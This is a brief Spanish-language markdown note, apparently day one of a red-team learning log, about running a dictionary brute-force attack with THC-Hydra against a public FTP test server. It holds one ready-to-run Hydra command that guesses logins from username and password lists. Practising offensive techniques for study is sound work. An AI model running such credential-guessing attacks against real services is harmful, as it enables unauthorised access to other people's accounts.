# Red Team – Día 1: Fuerza Bruta con Hydra

## Objetivo
Automatizar ataque de fuerza bruta con Hydra usando diccionarios sobre un servicio FTP público.

## Herramienta usada
- THC-Hydra v9.1

## Comando ejecutado
```bash
hydra -L usuarios.txt -P passwords.txt ftp://test.rebex.net
